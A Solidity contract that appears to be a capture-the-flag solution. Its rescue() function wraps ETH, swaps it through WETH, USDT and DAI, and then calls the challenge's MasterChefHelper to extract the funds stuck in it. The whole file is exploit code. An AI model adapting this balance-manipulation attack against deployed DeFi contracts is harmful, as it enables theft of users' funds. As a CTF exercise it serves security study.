// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./Setup.sol";

contract Exploiter {
    Setup setup = Setup(0x1DeD76422C7DB7d972CC2246F7aaca0a2E07404d);
    address public constant weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant usdt = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant dai = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    function setUp() public {
    }

    receive() external payable {}

    function rescue() public {
        MasterChefHelper helper = setup.mcHelper();
        UniswapV2RouterLike router = helper.router();
        WETH9(weth).deposit{ value: address(this).balance }();
        WETH9(weth).approve(address(router), WETH9(weth).balanceOf(address(this)));
        address[] memory path = new address[](2);
        path[0] = weth;
        path[1] = usdt;
        router.swapExactTokensForTokens(
            WETH9(weth).balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );

        ERC20Like(usdt).approve(address(router), ERC20Like(usdt).balanceOf(address(this)));
        path[0] = usdt;
        path[1] = dai;
        router.swapExactTokensForTokens(
            ERC20Like(usdt).balanceOf(address(this)),
            0,
            path,
            address(this),
            block.timestamp
        );


        ERC20Like(dai).approve(address(helper), ERC20Like(dai).balanceOf(address(this)));
        (address lpToken, ,,) = helper.masterchef().poolInfo(0);
        helper.swapTokenForPoolToken(0, dai, ERC20Like(dai).balanceOf(address(this)), 0);
    }
}
